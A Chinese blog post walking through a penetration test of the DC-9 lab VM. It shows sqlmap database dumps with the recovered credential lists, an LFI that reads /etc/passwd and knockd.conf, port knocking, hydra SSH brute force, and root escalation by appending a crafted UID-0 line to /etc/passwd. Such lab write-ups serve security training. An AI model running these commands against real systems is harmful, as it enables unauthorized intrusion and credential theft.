---
title: DC_9靶机渗透测试 
date: 2020-09-14 14:06
swiper: false # 将改文章放入轮播图中
swiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片
img: 'http://cdn.mxrblog.cn/ct_3.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片
categories: 渗透测试
tags: [渗透测试, DC]   # 可以是数组
top: false

---

# DC_9靶机渗透测试

- [参考链接1](https://www.shuzhiduo.com/A/gGdXme3Ez4/)
- [参考链接2](https://www.cnblogs.com/wzy-ustc/p/14621512.html)
- [参考链接3](http://www.paijuanxing.online/2021/03/01/DC9/)

### 信息收集

- 扫描靶机位置和端口

![image-20210705125748895](http://cdn.mxrblog.cn/image-20210705125748895.png)

- 打开靶机的web服务

![image-20210705130034011](http://cdn.mxrblog.cn/image-20210705130034011.png)

- 打开search页面，输入内容，用brupsuite进行分析

![image-20210705212346036](http://cdn.mxrblog.cn/image-20210705212346036.png)

![image-20210705211948005](http://cdn.mxrblog.cn/image-20210705211948005.png)

- 两次sql注入不一样的结果，极大可能存在sql注入漏洞

![image-20210705221321862](http://cdn.mxrblog.cn/image-20210705221321862.png)

![image-20210705221346996](http://cdn.mxrblog.cn/image-20210705221346996.png)

- 使用sqlmap进行sql注入，查看后台数据库

```
sqlmap -u http://192.168.1.10/results.php --data 'search=1' --dbs
```

- 找到数据库名user, Staff

![image-20210705223200559](http://cdn.mxrblog.cn/image-20210705223200559.png)

- 查看库名为Staff的表

```
sqlmap -u http://192.168.1.10/results.php --data 'search=1' -D Staff --tables
```

![image-20210705223503242](http://cdn.mxrblog.cn/image-20210705223503242.png)

- 查看该表中的列, 发现了用户名admin以及密码transorbital1

```
sqlmap -u http://192.168.1.10/results.php --data 'search=1' -D Staff -T Users --dump
```

![image-20210705224023999](http://cdn.mxrblog.cn/image-20210705224023999.png)

- 查看库user中的表

```
sqlmap -u http://192.168.1.10/results.php --data 'search=1' -D users --tables
```

![image-20210705224156757](http://cdn.mxrblog.cn/image-20210705224156757.png)

- 查看该表的列

```
sqlmap -u http://192.168.1.10/results.php --data 'search=1' -D users -T UserDetails --columns
```

- 查看列password和username的内容

```
sqlmap -u http://192.168.1.10/results.php --data 'search=1' -D users -T UserDetails -C username,password --dump
```

![image-20210705224546990](http://cdn.mxrblog.cn/image-20210705224546990.png)

- *将用户名和密码分别使用user和pwd装起来*

```
# user

marym
julied
fredf
barneyr
tomc
jerrym
wilmaf
bettyr
chandlerb
joeyt
rachelg
rossg
monicag
phoebeb
scoots
janitor
janitor2
admin
```

```
# pwd

3kfs86sfd
468sfdfsd2
4sfd87sfd1
RocksOff
TC&TheBoyz
B8m#48sd
Pebbles
BamBam01
UrAG0D!
Passw0rd
yN72#dsd
ILoveRachel
3248dsds7s
smellycats
YR3BVxxxw87
Ilovepeepee
Hawaii-Five-0
transorbital1
```



- 以用户名为admin登录靶机web后台

![image-20210705225719960](http://cdn.mxrblog.cn/image-20210705225719960.png)

- 发现底部有着 “file does not exist”,可能存在着LFI（文件包含漏洞）
- 而且这里的包含变量有可能是file不妨尝试一下
  经过不停的返回上一级目录（尝试）
- 使用wfuzz去fuzz LFI 

```
wfuzz  --hh 1341 -b 'PHPSESSID=m5bn4run22bpvrdgebofik7tbd' -c -w common.txt http://192.168.1.10/manage.php?FUZZ=../../../../../../../etc/passwd
```

![image-20210705232745889](http://cdn.mxrblog.cn/image-20210705232745889.png)

- 获得包含指定变量名的文件为file

```
SSH服务是容易被攻击的，相应的就衍生出一系列保护SSH的方法：

1、端口变化，并加强配置

2、设置用户白名单

3、完全隐藏允许SSH访问的事实，要求根据特殊的“敲门”序列识别有效用户：https://zhuanlan.zhihu.com/p/43716885

第三种方法常使用的工具是knockd，它侦听以太网或其他可用接口上的所有流量，等待特殊序列的端口命中。
```

- 通过查看目标服务器运行进程看看是否开启了knockd
- /proc/sched_debug中存放的是CPU的调度情况

![image-20210706000937229](http://cdn.mxrblog.cn/image-20210706000937229.png)

- 确定了目标服务器上运行了knockd以后，knockd的默认配置文件的位置在/etc/knockd.conf中

![image-20210706001254953](http://cdn.mxrblog.cn/image-20210706001254953.png)

- 通过查看knockd.conf 内容，确定了knock的顺序是7469， 8475， 9842

- 依次敲门

![image-20210706001911062](http://cdn.mxrblog.cn/image-20210706001911062.png)

- 还有其他敲门方法,如：

```
for x in 7469 8475 9842;do nmap ‐Pn ‐‐max‐retries 0 ‐p $x 192.168.1.10;done

安装knock
knock 192.168.1.10 7469 8475 9842
```

- 再次查看靶机端口开放情况， 发现ssh端口已经打开

![image-20210706002143194](http://cdn.mxrblog.cn/image-20210706002143194.png)

- 使用九头蛇（hydra）暴力破解ssh账号密码

```
hydra -L user -P pwd ssh://192.168.1.10
```

- 发现三个用户名和密码

![image-20210706003051231](http://cdn.mxrblog.cn/image-20210706003051231.png)

- 分别ssh登录，但只有在janitor用户下发现有效的信息

![image-20210706003707739](http://cdn.mxrblog.cn/image-20210706003707739.png)

- 将这些密码重新汇编成新密码本

![image-20210706004111803](http://cdn.mxrblog.cn/image-20210706004111803.png)

- 得到新用户以及密码，尝试ssh登录

![image-20210706004256962](http://cdn.mxrblog.cn/image-20210706004256962.png)

- sudo -l 发现该用户可以使用root权限的文件

![image-20210706004350459](http://cdn.mxrblog.cn/image-20210706004350459.png)

- 查看该文件，都是乱码，运行一下，给提示打开test.py文件

![image-20210706005058545](http://cdn.mxrblog.cn/image-20210706005058545.png)

- 在该目录的上上级目录中找到了test.py文件

![image-20210706005807314](http://cdn.mxrblog.cn/image-20210706005807314.png)

- 通过观察，test.py是由test文件编译过来的，作用是把一个文件的内容追加到第二个文件中

### 提权

***[两种提权方式连接](https://www.shuzhiduo.com/A/gGdXme3Ez4/)***

- 网上有两种提权方式，一种是往/etc/sudoers里面添加内容，让用户可以以root的权限去执行命令，另一种则是添加一个新的用户到/etc/passwd，然后新添加的用户登陆



- **第一种方法：往/etc/sudoers里面添加内容，让用户可以以root的权限去执行命令**

- 这里用Openssl来对密码进行加密,在进行编辑输入到/tmp/pwd

```
openssl passwd -1 -salt 'abcdefg' 123456 
得到密码
$1$abcdefg$a3UbImglR4PCA3x7OvwMX.输入到/tmp/pwd
echo 'admin:$1$abcdefg$a3UbImglR4PCA3x7OvwMX.:0:0::/root:/bin/bash' > /tmp/pwd
使用脚本吸入passwd文件中
sudo /opt/devstuff/dist/test/test /tmp/pwd /etc/passwd
```

![image-20210706015440393](http://cdn.mxrblog.cn/image-20210706015440393.png)

![image-20210706020239118](http://cdn.mxrblog.cn/image-20210706020239118.png)

![image-20210706020216962](http://cdn.mxrblog.cn/image-20210706020216962.png)





## 总结

- [openssl passwd](https://www.cnblogs.com/f-ck-need-u/p/6089869.html)
- 向/etc/passwd文件中添加用户和密码提权
- 向/etc/sudoers 更改已有用户权限

